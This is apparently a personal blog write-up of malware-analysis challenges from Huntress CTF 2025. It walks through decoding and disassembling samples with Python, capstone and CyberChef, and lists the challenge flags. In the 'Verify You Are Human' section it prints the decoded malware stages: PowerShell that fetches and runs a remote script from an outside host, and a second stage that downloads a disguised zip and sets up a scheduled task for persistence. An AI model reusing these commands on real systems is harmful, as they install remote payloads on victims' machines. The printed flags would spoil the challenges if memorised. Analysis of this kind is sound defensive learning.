---
layout: page
title: Huntress CTF 2025 Malware
tags: [CTF, Learning, Malware]
---

# Verify You Are Human

Spin up the VM and browse to page with developer tools open. A review of the site in Inspector window reveals some base64 code. Decoded it to get:

```pwsh
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://cb8c1afc.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

Next, I was able to pull the second stage using `curl` (though I had to upgrade to https and add my session token to the request ) which revealed another PowerShell command. This time it seemed to be downloading a zip file.

```pwsh
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://cb8c1afc.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

Another `curl` and the zip was retrieved. When unpacked, contained various Python related files and some dll files. **output.py** stood out on its name alone contained some base64, that decoded to another Python code block that performs some XOR and generates shellcode. I wrote this shellcode to file, and identified it was x86 based. I used this small piece of Python code to view the instructions it would use if run:

```python
from capstone import *
data = open("shellcode.bin","rb").read()
md = Cs(CS_ARCH_X86, CS_MODE_32)
for i in md.disasm(data, 0x0):
    print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))
```

![verify_human](/assets/img/huntress_ctf25/human_flag.jpg)

The following CyberChef recipe was used to extract the flag by copy/pasting the 10 hex values:

```
Regular_expression('User defined','0x[0-f]{8}',true,true,false,false,false,false,'List matches')
Reverse('Line')
From_Hex('Auto')
XOR({'option':'Hex','string':'0xa5a5a5a5'},'Standard',false)
Swap_endianness('Raw',4,true)
```

**`flag{d341b8d2c96e9cc96965afbf5675fc26}`**

# Spaghetti

I found the flags for this challenge in the following order (Oasis > MainFile > MEMEMAN) which is irrelevant but the large strings stood out to me first, then I overlooked the second large string blob for MEMEMAN!

## MainFileSettings

Found first file by noticing the **AYGIW.tmp** file started with HEX for a Windows Binary. Ran the following to convert the file HEX to bytes and run `strings` for the flag:

```bash
cat AYGIW.tmp| tr -dC '[:xdigit:]' | xxd -r -p | strings | grep "flag{"
```

**`flag{39544d3b5374ebf7d39b8c260fc4afd8}`**

## My Fourth Oasis

Open spaghetti file - obvious stand out was **$MyOasis4** found by searching for Oasis in the text.

String replace in CyberChef, followed by conversion of Binary data:

```
Find_/_Replace({'option':'Regex','string':'~'},'0',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'%'},'1',true,false,true,false)
From_Binary('None',8)
```

The decoded command contains additional HTML decoding, that can be converted in CyberChef using **From HTML Entity** to reveal the flag:

**`flag{b313794dcef335da6206d54af81b6203`**

## MEMEMAN

The function right below the Oasis one **$Tdefo** is decoded using the same recipe as above, with the flag being clear in the output:

**`flag{60814731f508781b9a5f8636c817af9d}`**

# SANDY

Run `file` command to see the file is UPX packed. Unpack and run `strings`. Spot **AutoIT** references. Used this [tool](https://github.com/nazywam/AutoIt-Ripper) to extract the AutoIT script.

Large number of base64 chunks around line 521. Copied them to a file and wrote a Python script to parse the chunks into one blob and decode it:

```python
import re, base64

with open('extracted.txt', 'r') as f:
	data = f.read()

# Extract all quoted strings from $base64chunks block
chunks = re.findall(r'"([^"]+)"', data)
joined = "".join(chunks)
decoded = base64.b64decode(joined)

#text = decoded.decode("utf-16le")
with open('decoded.txt', 'w') as f:
	f.write(decoded.decode('utf-16le'))
print('Decoded as UTF-16LE text and saved to decoded.txt')
```

Review of the decoded output has multiple base64 encoded blobs, so wrote another [script](https://gist.github.com/Pir00t/82928425d9726398278b94b745410369) to decode them all and write the output to log files (11 unique entries). Ran a `grep` for **flag** to retrieve the flag from one of the outputs:

**`flag{27768419fd176648b335aa92b8d2dab2}`**
